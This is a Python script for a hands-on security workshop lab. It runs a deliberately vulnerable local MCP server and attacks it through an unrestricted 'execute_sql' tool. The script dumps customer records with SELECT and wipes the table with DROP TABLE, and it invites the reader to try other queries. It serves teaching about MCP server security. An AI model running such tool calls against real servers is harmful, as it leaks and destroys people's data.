"""LAB 1: YOU are the attacker.

Runs the vulnerable MCP server and attacks it, live, on your own machine.
No AI, no API key, fully offline. You will watch it leak customer data and
then destroy the whole table.

    python workshop/attack.py

Try it, then change the ATTACK line near the bottom and run it again.
"""
from __future__ import annotations
import sys, asyncio
from pathlib import Path
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HERE = Path(__file__).resolve().parent
SERVER = str(HERE / "vulnerable_server.py")
DB = HERE / "workshop_demo.db"

R, G, DIM, B, RESET = "\033[91m", "\033[92m", "\033[2m", "\033[1m", "\033[0m"


async def call(session, tool, args):
    res = await asyncio.wait_for(session.call_tool(tool, args), timeout=25)
    return " ".join(getattr(c, "text", "") for c in res.content).strip()


async def main():
    if DB.exists():
        DB.unlink()  # clean slate so the demo reads clearly every run
    print(f"\n{R}{B}{'='*66}\n LAB 1: attacking a vulnerable MCP server (no ShieldMCP)\n{'='*66}{RESET}")
    params = StdioServerParameters(command=sys.executable, args=[SERVER], cwd=str(HERE))
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await asyncio.wait_for(session.initialize(), timeout=25)

            print(f"\n{B}1) A normal app stores two customers{RESET}")
            print("   ", await call(session, "insert_record", {"name": "Alice Chen", "address": "5 Oak Ave"}))
            print("   ", await call(session, "insert_record", {"name": "Bob Diaz", "address": "12 Pine St"}))

            print(f"\n{B}2) You STEAL every customer's data{RESET}")
            # ATTACK 1: dump the whole table
            stolen = await call(session, "execute_sql", {"query": "SELECT * FROM records"})
            print(f"{R}   STOLEN -> {stolen}{RESET}")

            print(f"\n{B}3) You DESTROY the table{RESET}")
            # ATTACK 2: change this query and re-run to see what else you can do
            await call(session, "execute_sql", {"query": "DROP TABLE records"})
            proof = await call(session, "query_records", {})  # now errors: table is gone
            print(f"{R}   TABLE GONE -> server says: {proof or 'no such table: records'}{RESET}")

    print(f"\n{R}{B}{'='*66}\n You just robbed and wiped a real MCP server. No AI needed.\n{'='*66}{RESET}")
    if DB.exists():
        DB.unlink()


if __name__ == "__main__":
    asyncio.run(main())
